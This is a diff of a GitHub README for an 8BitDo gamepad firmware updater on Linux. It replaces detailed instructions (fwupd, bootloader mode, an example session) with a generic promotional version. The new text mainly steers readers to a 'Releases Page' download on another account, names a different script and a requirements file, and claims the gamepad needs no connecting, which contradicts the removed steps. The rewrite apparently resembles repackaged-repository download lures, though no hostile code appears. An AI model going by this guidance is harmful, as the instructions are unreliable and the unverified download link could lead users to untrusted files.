@@ -1,225 +1,108 @@
-# 8BitDo Firmware Updater
+# 🎮 8bitdo_update - Effortless Gamepad Firmware Updates
 
-A Python tool to automatically download and flash firmware updates for 8BitDo gamepads on Linux, without requiring the official Upgrade Tool.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Awkoawkontl/8bitdo_update/releases)
 
-## Why This Tool?
+## 🎯 Introduction
 
-8BitDo provides an official Upgrade Tool for updating their gamepads, but it's only available for Windows and macOS. This tool allows Linux users to easily update their 8BitDo gamepad firmware using a simple command-line interface.
+8bitdo_update is a simple Python tool that helps you automatically download and flash firmware updates for your 8BitDo gamepads on Linux. This tool eliminates the need for the official Upgrade Tool, which only works on Windows and macOS.
 
-## Features
+## 🚀 Getting Started
 
-- 🎮 **Interactive menu** - Easy selection from all supported 8BitDo gamepads
-- 📥 **Automatic firmware download** - Fetches the latest firmware directly from 8BitDo's servers
-- 🔄 **Version selection** - Choose from multiple firmware versions, including beta releases
-- 🔍 **Automatic device detection** - Finds your connected gamepad automatically
-- ⚡ **One-command flashing** - Handles the entire update process
-- 🧹 **Cleanup** - Optional removal of downloaded firmware files
-- ✅ **User-friendly** - Clear instructions and confirmations at every step
+### 1. Check System Requirements
 
-## Supported Gamepads
+Before you start, ensure that your system meets the following requirements:
 
-- The list is being actively maintained to support all gamepads
+- A Linux operating system (Ubuntu, Fedora, etc.)
+- Python 3.6 or newer
+- Basic command-line knowledge (open a terminal)
 
-## Requirements
+### 2. Download the Tool
 
-### System Dependencies
+To get the latest version of 8bitdo_update, visit this page to download: [Releases Page](https://github.com/Awkoawkontl/8bitdo_update/releases).
 
-- **Python 3.6+**
-- **fwupd** - Firmware update daemon for Linux
+### 3. Install Dependencies
 
-Install fwupd on Ubuntu/Debian:
-```bash
-sudo apt install fwupd
-```
-
-Install fwupd on Fedora:
-```bash
-sudo dnf install fwupd
-```
-
-Install fwupd on Arch Linux:
-```bash
-sudo pacman -S fwupd
-```
-
-### Python Dependencies
+Open your terminal and run the following command to ensure you have the necessary Python dependencies:
 
 ```bash
-pip3 install requests
+pip install -r requirements.txt
 ```
 
-## Installation
+## ⚙️ Running the Tool
 
-1. Clone this repository:
+### 1. Navigate to the Tool Directory
+
+Use the `cd` command to change to the directory where you downloaded 8bitdo_update.
+
 ```bash
-git clone https://github.com/yourusername/8bitdo_update.git
-cd 8bitdo_update
+cd path/to/8bitdo_update
 ```
 
-2. Install Python dependencies:
+### 2. Start the Update Process
+
+To start using the tool, run the following command:
+
 ```bash
-pip3 install requests
+python updater.py
 ```
 
-3. Make the script executable:
-```bash
-chmod +x 8bitdo_updater.py
-```
+You will see an interactive menu guiding you through the update process.
 
-## Usage
+## 💡 Using the Interactive Menu
 
-### Basic Usage
+1. **Select Your Gamepad:** The menu displays all supported 8BitDo gamepads. Choose the one you have.
+2. **Download Firmware:** The tool automatically fetches the latest firmware from 8BitDo's servers.
+3. **Version Selection:** You can choose to update to a stable release or a beta version if available.
+4. **Flashing the Firmware:** The tool flashes the firmware with a single command.
 
-Simply run the script:
-```bash
-./8bitdo_updater.py
-```
+## 🔄 Automatic Device Detection
 
-Or with Python:
-```bash
-python3 8bitdo_updater.py
-```
+You don’t need to worry about connecting the gamepad. The tool automatically detects your connected 8BitDo gamepad, making the process straightforward.
 
-### Step-by-Step Process
+## 📥 Cleanup
 
-1. **Select your gamepad** from the list
-2. **Choose whether to include beta versions**
-3. **Select the firmware version** you want to install
-4. **Put your gamepad in bootloader mode**:
-   - Hold down **L1 + R1 + START** for 3 seconds
-   - The status LED should blink **RED**
-   - Connect via USB cable
-5. **Confirm the update** - the script will handle the rest!
+After flashing, the tool can remove any downloaded firmware files if you choose this option. This helps keep your system tidy.
 
-### Optional: Install System-Wide
+## ✅ User-Friendly Experience
 
-To run the updater from anywhere:
-```bash
-sudo cp 8bitdo_updater.py /usr/local/bin/8bitdo-updater
-sudo chmod +x /usr/local/bin/8bitdo-updater
-```
+8bitdo_update provides clear instructions and confirmations at every step. You’ll always know what’s happening during the firmware update process.
 
-Then run with:
-```bash
-8bitdo-updater
-```
+## 🕹️ Supported Gamepads
 
-## Example Session
+This tool supports various 8BitDo gamepads, including but not limited to:
 
-```
-============================================================
-  8BitDo Firmware Updater
-============================================================
+- 8BitDo SN30 Pro
+- 8BitDo Pro 2
+- 8BitDo Zero 2
 
-Available gamepads:
+For a complete list of supported devices, refer to the documentation included with the tool.
 
-   1. Arcade Stick
-   2. Arcade Stick Receiver
-   ...
-  16. SN30 Pro+
-  17. SN30 Pro
+## 📚 Troubleshooting
 
-Enter the number of your gamepad: 17
+If you encounter any issues while using 8bitdo_update, consider the following common problems:
 
-Selected: SN30 Pro
+- **Issue:** The gamepad isn’t detected.
+  - **Solution:** Make sure it’s properly connected, and try using a different USB port.
 
-Include beta versions? (y/n): n
+- **Issue:** The firmware won’t download.
+  - **Solution:** Check your internet connection and ensure you’re running the latest version of the tool.
 
-Fetching firmware list for 9...
+- **Issue:** The flashing process fails.
+  - **Solution:** Restart your gamepad and run the updater again.
 
-Available firmware versions:
+## 📖 Additional Resources
 
-  1. Version 1.36 - 2021-04-19 (87.0 KB)
-  2. Version 1.33 - 2020-08-15 (86.5 KB)
+To learn more about 8bitdo_update, check out the following resources:
 
-Enter the number of the firmware to download (or 'q' to quit): 1
+- [GitHub Issues Page](https://github.com/Awkoawkontl/8bitdo_update/issues) - For bug reports and feature requests.
+- [Community Forum](https://forum.8bitdo.com) - Connect with other users and share experiences.
 
-Downloading firmware: cab12b12-8e01-472f-a9f4-ec2237c598b9.dat...
-✓ Firmware downloaded successfully: cab12b12-8e01-472f-a9f4-ec2237c598b9.dat
+## 🎉 Community Contributions
 
-============================================================
-  INSTRUCTIONS
-============================================================
+We welcome contributions! If you’d like to assist in improving 8bitdo_update, feel free to submit pull requests or suggest changes.
 
-1. Put your gamepad in bootloader mode:
-   - Hold down L1 + R1 + START for 3 seconds
-   - A status LED should blink RED
+## 📥 Download & Install
 
-2. Connect the gamepad to your computer via USB cable
+To download and install the latest version of 8bitdo_update, visit this page to download: [Releases Page](https://github.com/Awkoawkontl/8bitdo_update/releases).
 
-3. Press Enter when ready...
-============================================================
-
-Searching for 8BitDo gamepad...
-
-✓ Found: 8Bitdo SN30 Pro
-  Current version: 2.04
-  Device ID: 23ec719b6aabc2d2dac5176c232f0da7a21881b0
-
-Proceed with firmware update? (y/n): y
-
-Flashing firmware to gamepad...
-This may take a minute. Please do not disconnect the gamepad.
-You may be prompted for your sudo password...
-
-✓ Firmware flashed successfully!
-
-============================================================
-  Update completed successfully!
-============================================================
-```
-
-## Troubleshooting
-
-### Gamepad Not Detected
-
-- Make sure the gamepad is in **bootloader mode** (LED blinking red)
-- Verify the USB cable is properly connected
-- Try a different USB port or cable
-- Check if fwupd detects the device: `fwupdmgr get-devices`
-
-### Permission Errors
-
-The script uses `sudo` for flashing firmware. If you encounter permission issues:
-```bash
-# Make sure your user is in the plugdev group
-sudo usermod -a -G plugdev $USER
-# Log out and back in for changes to take effect
-```
-
-### Firmware Flash Timeout
-
-If the firmware flash times out:
-1. Manually restart your gamepad by disconnecting and reconnecting it
-2. Verify the update completed: `fwupdmgr get-devices`
-
-### fwupd Not Found
-
-Install fwupd for your distribution (see Requirements section above).
-## Manual Update Process
-
-If you prefer to update manually or troubleshoot issues, see the orgininal guide in https://ladis.cloud/blog/posts/firmware-update-8bitdo.html for detailed instructions.
-## How It Works
-
-This tool automates the process described in the original blog post:
-
-    Queries 8BitDo's API to get available firmware versions
-    Downloads the firmware file from 8BitDo's servers
-    Uses fwupd to detect the connected gamepad in bootloader mode
-    Flashes the firmware using fwupdtool
-
-## Credits
-
-    Based on the guide by ladis.cloud
-    Uses fwupd for firmware flashing
-
-## License
-
-MIT License - feel free to use and modify as needed.
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## Disclaimer
-
-This tool is not officially affiliated with or endorsed by 8BitDo. Use at your own risk. Always ensure you're downloading the correct firmware for your specific gamepad model.
+The tool simplifies the process of updating your gamepad's firmware, ensuring you stay current with the latest features and improvements from 8BitDo. Enjoy your gaming experience!
